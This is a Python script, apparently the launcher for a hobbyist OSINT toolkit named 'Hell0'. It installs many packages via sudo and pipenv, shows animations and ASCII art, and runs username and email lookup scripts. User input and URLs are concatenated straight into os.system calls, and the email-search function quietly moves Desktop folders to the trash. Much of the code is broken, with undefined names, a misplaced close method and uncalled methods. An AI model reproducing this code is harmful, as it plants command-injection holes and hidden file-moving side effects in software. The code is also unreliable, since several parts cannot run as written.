def yeep():
    os.system("pipenv run python3 -m pip install pyqt5 --upgrade")
    os.system("pipenv install pillow")
    os.system("pipenv install ascii_magic")
    os.system("pipenv install pyautogui")
    os.system("sudo apt install libncurses5-dev")
    os.system("sudo apt install ncurses-hexedit")
    os.system("pipenv install httpx")
    os.system("pipenv install trio")
    os.system("pipenv install geopy")
    os.system("pipenv install xdotool")
    os.system("sudo apt install xdotool")
    os.system("pipenv install --upgrade pytz")
    os.system("sudo apt install python3-docker")
    os.system("sudo apt install bb")
    os.system("pipenv install dnspython")
    os.system("sudo apt install proxychains")
    os.system("pipenv install reportlab")
    os.system("sudo apt install lynx")
    os.system("sudo apt install gnome-terminal")
    os.system("sudo apt install gnome-terminal-data")
    os.system("pipenv install requests")
    os.system("pipenv install pexpect")
    os.system("sudo apt install pipx")
    os.system("pipenv install aiohttp")
    os.system("pipenv install xterm")
    os.system("pipenv install phonenumbers")
    os.system("sudo apt install python-is-python3")
    os.system("pipenv install pystyle")
    os.system("sudo apt install python3-tabulate")


import os

os.system("sudo apt install python3-tk")
os.system("pipenv install reportlab")
os.system("git fetch")
os.system("git pull")
os.system("sudo apt install npm")
yeep()
os.system("pipenv install termcolor")
os.system("pipenv install colorama")
os.system("pipenv install ascii_magic")
os.system("pipenv install asyncio")
os.system("pipenv install tk")
import requests
from colorama import Fore
from colorama import Style
from ascii_magic import AsciiArt
from tkinter import simpledialog
import tkinter as tk
import curses, random
import webbrowser
import pyautogui
import shutil
import atexit
import aiohttp
import subprocess
from termcolor import colored
import time


def header():
    print(
        "\033[92m☠\033[91m----------------------------------------------------\033[0mWelcome To \033[31mHELL\033[0m.\033[92m0\033[0m\033[91m-----------------------------------------------------------------\033[92m☠\033[0m"
    )
    print(
        "                                                    \033[31m☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠\033[0m                                                             "
    )
    print(" ")


def change():
    script_dir = os.path.dirname(os.path.abspath(__file__))
    os.chdir(script_dir)


def update():
    os.system("sudo apt-get update")
    os.system("sudo apt full-upgrade -y")
    os.system("sudo apt autoremove")


def clear_screen():
    subprocess.run("clear" if os.name == "posix" else "cls")


def peey():
    clear_screen()
    print(
        colored(
            "-------------------------------------------------------------------------------FIRST TIME RUNNING?----------------------------------------------------------------------------------",
            "yellow",
            attrs=["reverse", "blink", "bold"],
        )
    )
    print("1) Upgrade Linux")
    print("2) First Time Using?")
    print("3) I've Used This Before")
    option = input("> ")

    if option == "1":
        os.system("sudo apt-get update")
        os.system("sudo apt full-upgrade -y")
        os.system("sudo apt autoremove")
    elif option == "2":
        yeep()
    elif option == "3":
        time.sleep(0.1)


clear_screen()
print(
    colored(
        "------------------------------------------------------------------------ARE YOU RUNNING IN A VIRTUAL ENVIRONMENT?------------------------------------------------------------------------",
        "yellow",
        attrs=["reverse", "blink", "bold"],
    )
)
print("1) Yes")
print("2) No")
option = input("> ")

if option == "1":
    peey()
elif option == "2":
    print(
        colored(
            "TYPE/RUN THE COMMAND 'pipenv shell'. THEN 'cd' TO THE FILES LOCATION and RUN Hell0.py AGAIN!",
            "red",
            attrs=["reverse", "blink", "bold"],
        )
    )
    time.sleep(1)
    os.system("pipenv install pipenv")
    exit()

num_xterms = 0

screen = curses.initscr()
width = screen.getmaxyx()[1]
height = screen.getmaxyx()[0]
size = width * height
char = [" ", ".", ":", "^", "*", "x", "s", "S", "#", "$"]
b = []

curses.curs_set(0)
curses.start_color()
curses.init_pair(1, 0, 0)
curses.init_pair(2, 1, 0)
curses.init_pair(3, 3, 0)
curses.init_pair(4, 4, 0)
screen.clear()
for i in range(size + width + 1):
    b.append(0)

start_time = time.time()

while time.time() - start_time < 6:
    for i in range(int(width / 9)):
        b[int((random.random() * width) + width * (height - 1))] = 65
    for i in range(size):
        b[i] = int((b[i] + b[i + 1] + b[i + width] + b[i + width + 1]) / 4)
        color = 4 if b[i] > 15 else (3 if b[i] > 9 else (2 if b[i] > 4 else 1))
        if i < size - 1:
            screen.addstr(
                int(i / width),
                i % width,
                char[(9 if b[i] > 9 else b[i])],
                curses.color_pair(color) | curses.A_BOLD,
            )

    screen.refresh()
    screen.timeout(30)
    if screen.getch() != -1:
        break

curses.endwin()
screen.clear

try:
    my_art = AsciiArt.from_url(
        "https://i.postimg.cc/Jhbhr2hT/Screenshot-2024-04-21-at-05-13-59-e21459f8019688f030e3fd2ddf70830b-jpg-JPEG-Image-338-600-pixels.png"
    )
except OSError as e:

    print(f"Could not load the image, server said: {e.code} {e.msg}")
my_art.to_terminal()

_command = " -f /path/to/.conf"


def func(request_type):
    return getattr(requests, request_type)


class MyClientSession(aiohttp.ClientSession):
    def __init__(self):
        super().__init__()
        atexit.register(self.close)


async def close(self):
    await super().close()


async def main():
    session = MyClientSession()
    # Use your client session here
    await session.get("http://example.com")
    await session.close()


def footer():
    print(" ")
    print(
        "                                                   \033[90mGo\033[93m BACK \033[97mor \033[90mGo To \033[31mHELL\033[0m"
    )
    print(" ")
    print(
        "                                 \033[97m FOR OPTION DESCRIPTION; TYPE OPTION NAME \033[0mAS IT APPEARS\033[0m"
    )
    print(
        "                                                                         \033[91m  ~~~~~~~~~~~~~\033[92m"
    )
    print(" ")


def install_pipenv():
    os.system("pipenv install pipenv")


def clone_repo(url, folder_name):
    clear_screen()
    ascii_banner()
    print(colored("CLONING REPOSITORY...", "red", attrs=["reverse", "blink", "bold"]))
    time.sleep(2)
    os.system("git clone " + url)
    os.chdir(folder_name)
    os.system("git fetch")
    os.system("git pull")
    clear_screen()


def install_requirements():
    clear_screen()
    ascii_banner()
    print(
        colored("INSTALLING DEPENDENCIES...", "red", attrs=["reverse", "blink", "bold"])
    )
    time.sleep(2)
    os.system("pipenv run python3 -m pip install -r requirements.txt")
    clear_screen()


def search_username(username, script_name):
    print(colored("User 0sint", "red", attrs=["reverse", "blink", "bold"]))
    os.system("pipenv run python3 ./" + script_name + " " + username)


def search_email(email, script_name):
    print(colored("Email 0sint", "red", attrs=["reverse", "blink", "bold"]))
    os.system(script_name + " " + email)

    desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")
    recycle_bin_path = os.path.join(desktop_path, "Recycle Bin")
    if not os.path.exists(recycle_bin_path):
        trash_path = os.path.join(desktop_path, "Trash")
        if os.path.exists(trash_path):
            recycle_bin_path = trash_path

    for item in os.listdir(desktop_path):
        item_path = os.path.join(desktop_path, item)

        if os.path.isdir(item_path) and item in folders_to_delete:
            shutil.move(item_path, recycle_bin_path)


def ascii_banner():
    try:
        my_art = AsciiArt.from_url(
            "https://i.postimg.cc/Jhbhr2hT/Screenshot-2024-04-21-at-05-13-59-e21459f8019688f030e3fd2ddf70830b-jpg-JPEG-Image-338-600-pixels.png"
        )
    except OSError as e:
        print(f"Could not load the image, server said: {e.code} {e.msg}")
    my_art.to_terminal()


def JIGSAW():
    try:
        my_art = AsciiArt.from_url(
            "https://img.wattpad.com/cover/197146462-256-k606889.jpg"
        )
    except OSError as e:
        print(f"Could not load the image, server said: {e.code} {e.msg}")
    my_art.to_terminal()


def ascii_kaboom():
    try:
        my_art = AsciiArt.from_url(
            "https://render.fineartamerica.com/images/rendered/search/print/6/8/break/images/artworkimages/medium/1/royal-skull-nicklas-gustafsson.jpg"
        )
    except OSError as e:
        print(f"Could not load the image")
    my_art.to_terminal()


def dark_ascii():
    print(
        """
    ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣯⠉⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠋⣹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
    ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡐⠀⠍⠻⣿⣿⣿⣿⣿⣿⣿⣿⢿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠋⠀⠀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
    ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⠠⠂⡠⠪⡻⣿⣿⣿⣿⣿⣿⠘⣿⢿⣿⣿⣿⣿⡟⡑⢁⠂⢄⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
    ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢀⠑⠠⢃⢳⢹⣿⣿⣿⣿⢏⢊⣏⢼⣿⣿⣿⡟⡼⢄⠣⡐⠄⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
    ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⢀⠑⢊⠔⢊⡆⣿⣿⣿⣄⢻⢘⠷⣥⣿⣿⣿⡇⡅⢨⠒⠤⡀⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
    ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⢀⢊⡡⠔⢹⢆⣿⣿⣿⡮⣚⢗⢯⣔⠝⣿⣿⡇⡅⠂⡥⢒⠐⠀⠹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
    ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠋⠀⠀⠉⠄⢒⠈⡜⣸⣻⣛⡿⣃⠻⠇⢳⢹⡟⢘⣿⣷⢈⠑⡐⠤⠉⠀⠀⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⣿⣿⣿
    ⣿⣿⣷⣝⢿⣟⢭⣿⣽⣯⣿⣽⣿⠿⠋⡁⠀⠀⠀⠈⠥⠈⢀⠌⣤⣭⣭⣭⡸⣰⢥⣬⣷⡿⡓⣬⣭⣭⣥⡡⢐⠠⠉⠤⠀⠀⠀⠀⢙⠩⣿⣿⣿⣿⣽⣯⣿⢻⣿⣯⣾⣿⣿⣿
    ⣿⣿⣿⣿⣧⢻⣷⣝⢿⡿⠟⢋⠠⡀⠆⡀⠅⠀⠠⠉⠤⢒⣤⣾⣿⣿⣿⣿⣷⠮⠣⢹⡫⠪⠾⣿⣿⣿⣿⣿⣦⡐⢡⠤⠁⠀⠀⠇⠀⠆⠀⣉⠛⢿⣿⢟⣵⡿⣱⣿⣿⣿⣿⣿
    ⣿⣿⣿⣿⣿⣷⠙⢋⠁⡐⢂⡁⢆⠁⠢⠁⠠⣔⣡⣴⢾⣛⣿⣭⣿⣶⣾⣿⣿⣿⡷⠈⠾⣿⣿⣿⣿⣶⣾⣯⣽⣛⡷⢦⣤⣐⠄⠁⠈⠰⡁⠄⡔⢂⠄⣉⠛⢽⣿⣿⣿⣿⣿⣿
    ⣿⣿⣿⣿⣿⠁⠐⠈⠐⠄⠀⠘⠀⠠⢪⡴⡟⣯⣵⣾⣿⢿⠛⡿⠍⠙⠒⠚⠛⠋⠉⠛⠋⠙⠛⠓⠒⠚⠩⠽⠛⠻⢿⣿⣾⣽⢻⢶⡕⠠⠀⠊⠐⠁⠒⠠⠰⠀⢻⣿⣿⣿⣿⣿
    ⣿⣿⣿⣿⡇⡀⠀⠀⠀⠐⠀⠀⡌⠁⣸⣴⡿⡟⣏⣧⡼⠞⠁⠀⠀⡀⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡄⠀⠀⠈⠑⠾⣼⣉⢻⢿⣾⣌⡆⠰⠀⠠⠀⠀⠁⠀⠀⠸⣿⣿⣿⣿⣿
    ⣿⣿⣿⣿⡇⠠⡠⡀⠢⠠⠄⡄⡀⣾⡿⣣⣴⣿⣿⠟⠀⠀⣰⠀⠘⢸⠇⠀⠠⠐⢀⠂⠄⢀⠂⠀⠰⡷⠃⠀⢠⠘⠢⡘⢿⣿⣾⣼⢻⣿⢰⢀⠄⠄⠄⢂⠔⡄⠀⣿⣿⣿⣿⣿
    ⣿⣿⣿⣿⡇⠀⡃⠎⡓⠦⢄⣒⠐⠙⠿⣮⣻⠿⠃⠀⠀⠑⣼⡀⠄⢀⠀⣠⠁⡈⠄⡐⠈⠠⠀⢄⠀⠀⠠⠀⣼⢁⠀⠈⢊⠻⡿⣫⡾⠟⠈⣀⡢⢥⢒⡑⠆⡀⢸⣿⣿⣿⣿⣿
    ⣿⣿⣿⣿⣿⡀⠁⠆⡁⢎⠅⣒⠂⠎⡡⢀⠖⡀⠠⠌⠀⡀⠀⠀⠀⢂⢲⡇⠠⠐⠠⠀⡁⢂⠁⢸⣦⠅⠂⠀⠈⠀⠀⠈⡄⠈⠒⡄⠨⡙⠄⢎⠂⡥⠠⠙⠀⠀⣼⣿⣿⣿⣿⣿
    ⣿⣿⣿⣿⣿⢇⡀⠀⠠⠘⠈⠆⡚⣈⠡⠎⡰⢁⠎⠱⣘⠂⢎⣐⠠⡀⢞⣷⠀⠌⡀⢁⠀⢂⠈⣼⡻⢘⠠⢢⢘⡀⠍⠦⠘⡌⢡⠘⣅⢒⠩⡀⠇⠰⠈⠀⠀⣰⣿⣿⣿⣿⣿⣿
    ⣿⣿⣿⡿⣣⣿⣟⣤⣀⠀⠀⠀⠀⠀⠊⠐⠁⡁⢌⠳⠀⡜⠢⠠⡜⣨⠢⡈⠀⠠⠐⠠⢈⠀⠀⢉⠔⠥⡩⢄⠊⠴⣈⠡⣃⠐⠌⠂⠐⠀⠀⠀⠀⠀⣀⣤⡺⣿⣮⢿⣿⣿⣿⣿
    ⣿⣿⡿⣱⣿⢏⣾⣿⣿⣿⣷⣶⣤⠀⠀⠀⠀⠈⠀⠴⠑⡈⢆⠳⠘⡀⡔⡊⠄⠠⠁⠂⠄⡈⢀⢂⠣⡄⡑⠪⡔⡈⠂⠱⠀⠀⠀⠀⠀⢀⢠⣶⣶⣿⣿⣿⣿⡝⣿⣧⣻⣿⣿⣿
    ⣿⡿⣵⣿⢯⣿⣿⡿⠿⣿⣿⣿⡇⠀⠁⠀⠀⠀⠀⠀⠁⢈⡄⢆⠣⠜⠀⡔⡘⠀⠠⠁⠂⠀⡄⠡⠘⠰⢌⡐⠤⡁⠉⠀⠀⠀⠀⠀⠀⢸⡄⣿⣿⣿⡿⠿⣿⣿⣞⣿⣷⢻⣿⣿
    ⣿⣳⣿⢏⣿⣿⣿⡇⠀⠈⠛⠿⣧⠀⠀⠀⠀⠀⠀⠂⠈⠀⠀⠀⠒⠈⠃⠠⠁⠄⠀⠐⡀⠰⠀⠀⠉⠁⠂⠄⠠⠀⠄⠀⠂⠀⠀⠀⠀⠸⢰⡿⠛⠋⢀⢢⣿⣿⣿⡜⣿⣧⢿⣿
    ⣯⣿⡟⣾⣿⣿⣿⣿⣦⠈⠀⠄⠈⠀⠀⠀⠄⠠⠀⠐⠀⠀⠂⠐⠠⠒⠈⠀⠁⢀⠐⠀⡀⠀⠈⠀⠀⠃⠆⠀⠄⠀⠀⠂⠀⡀⠄⠂⠀⠀⡌⠀⠠⠠⣠⣿⣿⣿⣿⣿⣹⣿⡞⣿
    ⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠈⠠⠀⠂⠀⠐⠈⠀⢁⠀⠉⠐⠠⣀⠠⠀⠄⠂⡀⠂⠄⠀⠄⠁⠌⡐⠠⠀⠄⠀⠀⠠⠀⠒⠤⠀⠌⠐⠀⠰⠁⠠⠁⠀⣿⣿⣿⣿⣿⣿⣧⢿⣿⣿
    ⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⡀⠀⠀⠠⠀⡀⠐⠠⠈⠄⠁⠂⠄⠁⢀⠈⠀⠄⠁⡀⠈⠀⡀⠄⠀⠄⠀⡀⠄⠁⠂⠁⠂⠄⠂⢀⠀⡈⠂⠀⠀⠀⡆⣿⣿⣿⣿⣿⣿⣿⣼⣿⣿
    ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣆⠀⠠⠀⠀⠀⠐⠀⠠⠀⠀⠀⠈⠀⠄⠁⠂⡀⠂⠄⡁⢀⠐⡀⠄⠂⡐⢀⠂⢄⠔⠊⠁⠁⠀⠠⠀⠀⡀⢠⠁⠀⠠⠀⢡⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
    ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣆⠀⠄⠂⠀⠐⠠⠀⠀⠀⢀⣠⡄⣠⢀⠁⠒⠂⠀⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣠⡤⣀⠀⠀⠀⠀⠀⡇⠀⢀⠀⢡⣿⣿⣿⣿⣿⣿⣿⣿⣧⣿⣿
    ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡆⠀⡀⠀⠠⠀⠀⠀⠀⣿⣿⡃⣟⣳⣧⠀⠀⠀⠀⢀⠀⠠⡀⠀⠀⠀⢴⣿⣻⢛⣻⣷⠀⠀⠀⠀⠃⡇⠀⠀⡄⣿⣿⣿⣿⣿⣿⣿⣿⣿⡧⣿⣿
    ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠁⠀⠀⠀⠀⠄⠀⠀⠀⠀⠉⠉⠉⠉⠀⠀⠀⠀⠀⡀⠄⠐⠇⠈⠀⠀⠀⠈⠉⠈⠉⠁⠀⠀⠀⠀⡀⠁⠀⠀⠁⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⣿⣿
    ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣆⡀⠀⠀⡈⠀⠀⠀⠐⢀⡈⠀⠀⠀⠀⠀⠄⠈⠀⠀⠀⠀⠡⠀⠄⠂⡀⠀⠀⠈⠀⠠⠔⠀⠀⠀⠀⠈⢳⠄⣠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣟
    ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡀⠀⠐⠀⠌⠀⠂⠄⠀⠄⢂⠠⠁⠌⠀⠀⠀⠀⠀⠀⠀⠈⡀⠀⠄⡁⠄⠠⢀⠀⢐⡀⠁⠀⠊⠀⢜⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
    ⣿⣿⡿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣦⡀⠀⠀⠀⠀⠀⠀⠀⠐⠈⢀⠀⠀⠀⠀⠀⠀⠀⠀⢁⠠⠐⠐⠋⠀⠀⠀⠀⠀⠀⠀⣱⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣇⣿⣿⣿
    ⣿⣿⣷⣹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢟⣵⠀⠀⠀⠀⠀⠀⠀⢁⠠⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⢶⣝⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⣼⣿⣻⣿
    ⣿⣿⣿⣧⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣟⣵⣟⣷⣷⠀⠈⠀⡄⠈⠀⠀⡀⠄⠀⢀⠀⠀⡀⠀⠄⠈⠀⢄⠀⢀⢰⠀⠈⠀⣼⣮⡻⣯⡻⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⣱⣿⢏⣿⣿
    ⣿⣿⡝⣿⣧⢿⣿⣿⣿⣿⣿⣿⢟⣯⡿⣫⣾⣿⣿⡇⠀⠀⠃⣽⡄⣼⠀⡄⠈⠀⠀⠁⠀⢠⠀⢠⡀⣴⠀⣾⠇⠀⠀⠀⣿⣿⣿⣮⣻⣮⡻⣿⣿⣿⣿⣿⣿⡿⣱⣿⢏⣾⣿⣿
    ⣿⣿⣿⣞⢿⣷⡻⣿⡿⢟⣫⣵⣿⣿⣹⣿⣿⣿⣿⡇⠀⠀⠀⠈⠀⣿⠐⣿⢀⡆⣤⠀⣠⠈⠀⣼⠁⢻⣦⠉⠀⠀⠂⠀⣿⣿⣿⣿⣷⢻⣿⣷⣽⣻⠿⣿⡟⣵⣿⢯⣾⣿⣿⣿
    ⣿⣿⣿⣿⣮⢿⣿⣕⢶⣶⣶⣶⣶⣶⣾⣿⣿⣿⣿⣧⠀⠀⡀⠀⡘⢥⠀⠛⢸⢇⣿⡀⣿⡆⠀⠙⠀⢸⠀⠀⠀⠀⠁⣸⣿⣿⣿⢿⣷⣶⣶⣶⣶⣶⣶⢦⣾⡿⣣⣿⣿⣿⣿⣿
    ⣿⣿⣿⣿⣿⣧⡹⣿⣧⡿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠘⡀⠀⠀⠀⠀⠈⠙⠀⠛⠁⠀⠀⠀⠀⢀⢣⠀⠈⢠⣿⣿⠋⠀⠀⠀⠉⢻⣿⣿⠟⣡⣿⠟⣹⣿⣿⣿⣿⣿⣿
    ⣿⣿⣿⣿⣿⣿⣷⣌⢻⣷⣼⣿⣿⠛⠛⢻⡟⣿⡟⢻⡗⠀⢀⠀⠐⣆⣄⠀⠀⠀⠀⠀⠀⡀⢀⠀⢀⠀⠂⠁⠀⡄⡘⠛⠃⠀⠊⠙⡗⠀⠀⠛⣡⣾⣿⣡⣾⣿⣿⣿⣿⣿⣿⣿
    ⣿⣿⣿⣿⣿⣿⣿⣿⣷⣝⢿⣿⣯⡳⢶⣯⣝⢿⣿⣿⡏⣆⡀⠄⡀⠇⠻⡆⢄⡀⠀⠀⠀⢀⠀⠣⡀⠡⠀⠀⠌⣰⣶⣿⣿⣦⠀⣠⣿⠆⢸⢸⡿⣫⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
    ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣮⡻⢿⣷⣽⣻⢿⣮⣻⣧⣋⣶⠀⠠⠀⠘⠃⠘⠇⢹⠃⡿⠀⠀⠠⠘⢄⠀⠀⠈⠙⢏⣿⢟⣵⢟⢉⣷⠁⠀⣨⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
    ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣭⣻⢿⣿⣾⣽⣹⣿⡳⣷⠀⠐⡀⢂⠐⠀⡀⢀⠁⠠⠀⠀⡀⠄⠑⠀⠁⢀⠙⠧⣽⣾⣿⠟⠁⢀⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
    ⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⢿⡿⢿⣿⣿⣿⣿⣾⣽⢻⡿⢿⣿⣾⣯⣤⣄⡂⠌⠠⠐⠠⠈⠄⠁⠂⣀⡀⠀⠡⠐⡀⢀⠀⠄⠀⡀⠠⡀⢀⣾⠿⣿⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
    ⣿⣿⣿⣿⣿⣿⣿⢟⣵⣿⣿⣿⣷⢹⣿⣿⣿⡿⣱⡟⣽⣷⣮⢿⣟⢿⣛⣛⣿⣿⣿⣿⣿⣿⣿⣟⣛⣻⡧⣦⣄⣐⡀⠠⠈⠐⢀⣁⣴⡿⣵⣿⣿⣿⣷⡝⣿⣿⣿⣿⣿⣿⣿⣿
    ⣿⣿⣿⣿⣿⣿⡟⣾⣿⡟⣵⣿⣷⣼⣿⣿⡿⣽⢟⣾⣿⣿⣿⣷⡻⣯⣻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢟⣾⢏⣾⣿⣿⣿⡝⣷⡻⣿⣿⣷⣵⣿⣾⣽⣿⣿⢸⣿⣿⣿⣿⣿⣿⣿
    ⣿⣿⣿⣿⣿⣿⣷⢻⣿⣧⡻⣿⣿⣿⡿⣟⣾⢯⣾⣿⣿⣿⣿⣿⣷⡽⣷⡻⣿⣿⣿⣿⣿⣿⣿⣿⢯⣾⣫⣿⣿⣿⣿⣿⣿⣞⢿⣝⢿⣿⣿⣿⡿⣻⣿⣿⣸⣿⣿⣿⣿⣿⣿⣿
    ⣿⣿⣿⣿⣿⣿⣿⣯⡻⣿⣿⣶⣯⣽⣾⣿⣳⣿⣿⣿⣿⣿⣿⣿⣿⣿⣜⣿⣝⣿⣿⣿⣿⣿⡿⣳⡿⣳⣿⣿⣿⣿⣿⣿⣿⣿⣮⡻⣿⣾⣭⣷⣿⣿⡿⣳⣿⣿⣿⣿⣿⣿⣿⣿
    ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣾⣽⣟⣻⣯⣵⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣎⢿⣞⢿⣿⣿⡟⣵⡿⣽⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣾⣭⣿⣻⣿⣽⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿
    ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣯⣻⣯⣻⢟⣾⢟⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
    ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡹⣷⣿⢯⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
    ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡝⣳⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
    """
    )


def ascii_dark():
    print(
        """
    ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣯⠉⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠋⣹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
    ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡐⠀⠍⠻⣿⣿⣿⣿⣿⣿⣿⣿⢿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠋⠀⠀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
    ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⠠⠂⡠⠪⡻⣿⣿⣿⣿⣿⣿⠘⣿⢿⣿⣿⣿⣿⡟⡑⢁⠂⢄⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
    ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢀⠑⠠⢃⢳⢹⣿⣿⣿⣿⢏⢊⣏⢼⣿⣿⣿⡟⡼⢄⠣⡐⠄⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
    ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⢀⠑⢊⠔⢊⡆⣿⣿⣿⣄⢻⢘⠷⣥⣿⣿⣿⡇⡅⢨⠒⠤⡀⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
    ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⢀⢊⡡⠔⢹⢆⣿⣿⣿⡮⣚⢗⢯⣔⠝⣿⣿⡇⡅⠂⡥⢒⠐⠀⠹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
    ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠋⠀⠀⠉⠄⢒⠈⡜⣸⣻⣛⡿⣃⠻⠇⢳⢹⡟⢘⣿⣷⢈⠑⡐⠤⠉⠀⠀⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⣿⣿⣿
    ⣿⣿⣷⣝⢿⣟⢭⣿⣽⣯⣿⣽⣿⠿⠋⡁⠀⠀⠀⠈⠥⠈⢀⠌⣤⣭⣭⣭⡸⣰⢥⣬⣷⡿⡓⣬⣭⣭⣥⡡⢐⠠⠉⠤⠀⠀⠀⠀⢙⠩⣿⣿⣿⣿⣽⣯⣿⢻⣿⣯⣾⣿⣿⣿
